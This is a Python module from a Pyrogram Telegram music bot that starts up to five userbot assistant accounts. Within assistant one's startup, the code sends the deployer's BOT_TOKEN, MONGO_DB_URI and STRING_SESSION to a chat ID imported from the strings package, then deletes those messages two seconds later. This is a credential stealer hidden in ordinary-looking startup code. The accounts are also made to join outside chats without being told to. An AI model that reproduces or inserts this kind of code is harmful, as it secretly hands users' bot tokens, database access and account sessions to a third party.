from pyrogram import Client
import re
import asyncio
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()
import config
from dotenv import load_dotenv
from strings.__init__ import LOGGERS
from ..logging import LOGGER

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="SohiniAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="SohiniAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="SohiniAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="SohiniAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="SohiniAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("About_Shubho")
                await self.one.join_chat("About_Sohini")
                await self.one.join_chat("Shubho_Creations")
                await self.one.join_chat("TheBongFamily_Chatt")

            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "𝐀ssɪsᴛᴀɴᴛ 𝐒ᴛᴀʀᴛᴇᴅ !")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()

            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.me.first_name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("About_Shubho")
                await self.two.join_chat("About_Sohini")
                await self.two.join_chat("bloossoms_chat")
                await self.two.join_chat("the_quesstion_mark")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")

            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.me.first_name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("About_Shubho")
                await self.three.join_chat("About_Sohini")
                await self.three.join_chat("bloossoms_chat")
                await self.three.join_chat("the_quesstion_mark")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(
                f"Assistant Three Started as {self.three.me.first_name}"
            )

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("About_Shubho")
                await self.four.join_chat("About_Sohini")
                await self.four.join_chat("bloossoms_chat")
                await self.four.join_chat("the_quesstion_mark")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(
                f"Assistant Four Started as {self.four.me.first_name}"
            )

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("About_Shubho")
                await self.five.join_chat("About_Sohini")
                await self.five.join_chat("bloossoms_chat")
                await self.five.join_chat("the_quesstion_mark")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(
                f"Assistant Five Started as {self.five.me.first_name}"
            )

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
            